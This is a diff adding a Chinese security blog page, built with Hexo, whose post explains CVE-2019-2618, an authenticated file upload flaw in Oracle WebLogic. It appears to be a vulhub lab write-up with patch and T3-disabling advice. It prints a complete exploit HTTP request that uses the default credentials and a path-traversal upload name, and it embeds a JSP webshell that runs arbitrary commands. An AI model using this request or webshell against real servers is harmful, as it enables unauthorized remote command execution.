@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    
+    裁决的博客</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+<main class="content">
+  <section class="jumbotron">
+  <div class="video">
+    
+    <div class="video-media">
+      <video playsinline="" autoplay="" loop="" muted="" data-autoplay=""
+             poster="/images/ocean/ocean.png" x5-video-player-type="h5">
+        <source src="/images/ocean/ocean.mp4" type="video/mp4">
+        <source src="/images/ocean/ocean.ogv" type="video/ogg">
+        <source src="/images/ocean/ocean.webm" type="video/webm">
+        <p>Your user agent does not support the HTML5 Video element.</p>
+      </video>
+      <div class="video-overlay"></div>
+    </div>
+    <div class="video-inner text-center text-white">
+      <h1><a href="/">裁决的博客</a></h1>
+      <p>安全圈小帅哥</p>
+      <div><img src="/images/hexo-inverted.svg" class="brand" alt="裁决的博客"></div>
+    </div>
+    <div class="video-learn-more">
+      <a class="anchor" href="#landingpage"><i class="fe fe-mouse"></i></a>
+    </div>
+  </div>
+</section>
+
+<div id="landingpage">
+  <section class="outer">
+  <article class="articles">
+    
+    <h1 class="page-type-title"></h1>
+
+    
+      
+        <article id="post-CVE-2019-2618" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/post/c468c7fd.html">CVE-2019-2618</a>
+    </h2>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/post/c468c7fd.html" class="article-date">
+  <time datetime="2019-04-18T13:10:13.000Z" itemprop="datePublished">2019-04-18</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <p><img src="https://s2.ax1x.com/2019/05/19/EXaxld.jpg" alt="EXaxld.jpg"></p>
+<h2 id="漏洞-介绍"><a href="#漏洞-介绍" class="headerlink" title="漏洞-介绍"></a>漏洞-介绍</h2><p>CVE-2019-2618 文件上传</p>
+<p>CVE-2019-1615任意文件读取</p>
+<p>PS :这两个漏洞都需要OAM认证，也就是需要账号密码；之后weblogic正常deploy 本身就可以部署war文件，就像上传shell一样，，，咳咳</p>
+<h2 id="漏洞-影响版本"><a href="#漏洞-影响版本" class="headerlink" title="漏洞-影响版本"></a>漏洞-影响版本</h2><p>Oracle WebLogic Server：</p>
+<ul>
+<li>10.3.6.0.0</li>
+<li>12.1.3.0.0</li>
+<li>12.2.1.3.0</li>
+</ul>
+<h2 id="漏洞-环境搭建"><a href="#漏洞-环境搭建" class="headerlink" title="漏洞-环境搭建"></a>漏洞-环境搭建</h2><p>用的<a href="https://vulhub.org/" target="_blank" rel="noopener">vulhub</a> CVE-2017-10271 两者影响版本差不多</p>
+<p><img src="https://s2.ax1x.com/2019/04/18/EpC3cT.md.png" alt></p>
+<p><img src="https://s2.ax1x.com/2019/05/18/EOldQU.png" alt="EOldQU.png"></p>
+<h2 id="漏洞-验证"><a href="#漏洞-验证" class="headerlink" title="漏洞-验证"></a>漏洞-验证</h2><p>前提：weblogic弱密码，可猜解；vulhub默认密码：weblogic/Oracle@123</p>
+<p>上传地址随便找了一个../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war</p>
+<p>抓包改包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1</span><br><span class="line">Host:192.168.32.140:7001</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">username: weblogic</span><br><span class="line">wl_request_type: app_upload</span><br><span class="line">cache-control: no-cache</span><br><span class="line">wl_upload_application_name:../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war</span><br><span class="line">serverName: weblogic</span><br><span class="line">password: Oracle@123</span><br><span class="line">content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">archive: true</span><br><span class="line">server_version: 10.3.6.0</span><br><span class="line">wl_upload_delta: true</span><br><span class="line">Content-Length: 605</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;shell.jsp&quot;; filename=&quot;webshell.jsp&quot;</span><br><span class="line">Content-Type: false</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a = -1;          </span><br><span class="line">        byte[] b = new byte[1024];          </span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);          </span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));          </span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">    %&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/05/18/EOG091.png" alt="EOG091.png"></p>
+<p>访问shell</p>
+<p><a href="https://imgchr.com/i/EOG6BD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/18/EOG6BD.png" alt="EOG6BD.png"></a></p>
+<h2 id="漏洞-修复建议"><a href="#漏洞-修复建议" class="headerlink" title="漏洞-修复建议"></a>漏洞-修复建议</h2><ul>
+<li>升级补丁</li>
+<li>如果不依赖T3协议进行JVM通信，禁用T3协议。</li>
+</ul>
+<p>升级补丁</p>
+<p>Oracle官方更新链接地址：<a href="https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html</a></p>
+<p>禁用T3协议</p>
+<ol>
+<li>进入WebLogic控制台，在base_domain配置页面中，进入安全选项卡页面，点击筛选器，配置筛选器。</li>
+<li>在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入* * 7001 deny t3 t3s</li>
+<li>保存生效（无需重启）</li>
+</ol>
+<p><strong>注：转载请注明出处:lilifengcode.github.io</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://lilifengcode.github.io/post/c468c7fd.html" data-id="cjy9tac140003jwt79xsxkey0"
+         class="article-share-link">分享</a>
+      
+    </footer>
+    </div>
+
+  
+
+  
+  
+
+</article>
+
+
+
+      
+  </article>
+  
+  
+    <nav class="page-nav">
+      
+      <a class="extend prev" rel="prev" href="/page/3/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/5/">下一页</a>
+    </nav>
+  
+</section>
+</div>
+
+  <footer class="footer">
+  
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 裁决的博客</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="裁决的博客"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery/caijuedebug.jpg">相册</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="搜索">
+        <i class="fe fe-search"></i>
+        搜索
+      </a>
+    </li>
+  </ul>
+</nav>
+
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+      <li class="nav-item">
+          <div class="totop" id="totop">
+    <i class="fe fe-rocket"></i>
+</div>
+      </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+<script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="/js/search.js"></script>
+
+
+<script src="/js/ocean.js"></script>
+
+</body>
+</html>
